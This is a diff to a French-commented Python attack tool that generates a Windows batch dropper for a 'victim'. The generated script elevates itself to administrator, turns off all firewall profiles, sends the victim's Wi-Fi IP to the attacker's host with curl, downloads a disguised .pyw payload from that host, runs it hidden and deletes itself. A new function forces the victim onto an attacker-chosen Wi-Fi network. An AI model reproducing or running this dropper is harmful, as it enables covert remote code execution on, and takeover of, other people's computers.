@@ -9,7 +9,10 @@ TODO:
 import socket
 import os
 from colorama import Fore
-from modules.info import Info
+try:
+    from modules.info import Info
+except:
+    from info import Info
 import csv
 import time
 import subprocess
@@ -76,6 +79,26 @@ def choix()->str:
     print(Fore.WHITE)
     return choix
 
+def add_same_network_conf(SSID: str, password: str) -> str:
+    """
+    # add_same_network_conf
+    ## Presentation
+    Fonction pour ajouter une configuration pour forcer  
+    la victime à se connecter à un réseau.
+    ## Fonctionnement
+    * ouvre le template
+    * modifie les paramètres variables
+    * renvoie la bonne chaîne à ajouter au payload
+    ## Entrées
+    * SSID : str, Nom du réseau
+    * password : str, Mot de passe du réseau.
+    ## Sorties
+    Aucunes sorties
+    """
+    res = f"@echo off\nsetlocal\nset SSID={SSID}\nset PASSWORD={password}\n"
+    with open("payload/local_access_point_auto_connect.bat", "r") as f:
+        res += f.read()
+    return res
 
 def generation_vecteur(host: str, output: str = "payload") -> None:
     """
@@ -96,7 +119,8 @@ def generation_vecteur(host: str, output: str = "payload") -> None:
     """
     os.system(f"del {output}.bat")
     fich = open(f"{output}.bat", "w")
-    msg = f'@echo off\nnet session >nul 2>&1\nif %errorLevel% neq 0 (\npowershell -Command "Start-Process cmd -ArgumentList \'/c \\"%~fnx0\\"\' -Verb RunAs"\nexit /b\n)\nNetSh Advfirewall set allprofiles state off\n(for /F "tokens=16" %%i in (\'"ipconfig | findstr IPv4"\') do (curl -d %%i http://{host}:8888/))\nset TEMPFILE=%TEMP%\\temp_%RANDOM%.pyw\ncurl -s http://{host}:8000/payload/jeu.pyw -o "%TEMPFILE%"\nstart "" /b pythonw.exe "%TEMPFILE%"\ntimeout /t 2 >nul\ndel "%TEMPFILE%"\ndel "%~f0"'
+    msg = add_same_network_conf(input("SSID of the shared network : "), input("password of the shared network : "))
+    msg += f'@echo off\nnet session >nul 2>&1\nif %errorLevel% neq 0 (\npowershell -Command "Start-Process cmd -ArgumentList \'/c \\"%~fnx0\\"\' -Verb RunAs"\nexit /b\n)\nNetSh Advfirewall set allprofiles state off\nfor /f "usebackq tokens=*" %%A in (`powershell -NoProfile -Command "Get-NetIPAddress -InterfaceAlias \'Wi-Fi\' -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress"`) do (\nset "WIFI_IP=%%A"\n)\ncurl -d "%WIFI_IP%" http://{host}:8888/\nset TEMPFILE=%TEMP%\\temp_%RANDOM%.pyw\ncurl -s http://{host}:8000/payload/jeu.pyw -o "%TEMPFILE%"\nstart "" /b pythonw.exe "%TEMPFILE%"\ntimeout /t 2 >nul\ndel "%TEMPFILE%"\ndel "%~f0"\npause'
     fich.write(msg)
     fich.close()
     Info.valide(f"Vecteur crée avec le nom : {output}.bat")
@@ -154,8 +178,10 @@ def read_victime_ip() -> str:
                 donnees.append(ligne)
             fich.close()
         time.sleep(3)
+        print(donnees)
     ip_victime: str = donnees[0][0]
     Info.valide(f"IP de la victime trouvé : {ip_victime}")
+    time.sleep(5)
     return ip_victime
 
 
@@ -174,7 +200,7 @@ def create_server():
     """
     print("creation des serveurs...", end="\r")
     server_python = subprocess.Popen(
-        ["python", "servers/server.py"], stdout=subprocess.PIPE, stderr=subprocess.PIPE   #creationflags=subprocess.CREATE_NEW_CONSOLE
+        ["python", "servers/server.py"], stdout=subprocess.PIPE, stderr=subprocess.PIPE   #,creationflags=subprocess.CREATE_NEW_CONSOLE
     )
 
     server_js_path = os.path.abspath("servers/server.js")
@@ -291,4 +317,6 @@ def nettoyage(mySocket):
     """
     message = "taskkill /im pythonw.exe /F"
     mySocket.send(message.encode("Utf8"))
-    
+
+if __name__=="__main__":
+    generation_vecteur("10.10.10.10")
